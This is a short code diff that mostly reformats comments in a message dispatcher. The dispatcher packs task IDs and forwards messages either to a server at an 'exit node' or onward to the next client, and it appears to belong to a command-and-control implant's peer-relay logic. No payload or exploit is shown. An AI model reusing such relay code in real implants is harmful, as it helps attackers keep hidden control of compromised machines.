@@ -136,8 +136,7 @@ namespace Dispatcher {
 
         while (head) {
             if (B_PTR(head->buffer)[0] != 0) {
-                // if a message is inbound , don't process it
-                continue;
+                continue; // if a message is inbound , don't process it
             }
             if (head->buffer) {
                 Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
@@ -145,12 +144,12 @@ namespace Dispatcher {
                 Stream::PackDword(out, head->task_id);
                 Stream::PackDword(out, head->msg_type);
 
-                if (Ctx->root) {
-                    // if message has reached exit node, prepare final header for server by prepending msg body length
-                    Stream::PackBytes(out, B_PTR(head->buffer), head->length);
+                // if message has reached exit node, prepare final header for server by prepending msg body length
+                // else leave as-is for the next client
 
+                if (Ctx->root) {
+                    Stream::PackBytes(out, B_PTR(head->buffer), head->length);
                 } else {
-                    // else leave as-is for the next client
                     out->buffer = x_realloc(out->buffer, out->length + head->length);
 
                     x_memcpy(B_PTR(out->buffer) + out->length, head->buffer, head->length);
@@ -230,7 +229,7 @@ namespace Dispatcher {
         _parser parser = { };
 
         Parser::CreateParser(&parser, B_PTR(in->buffer), in->length);
-        Parser::UnpackDword(&parser); // todo: maybe generate new pid every task?
+        Parser::UnpackDword(&parser);
 
         Ctx->session.current_taskid = Parser::UnpackDword(&parser);
 
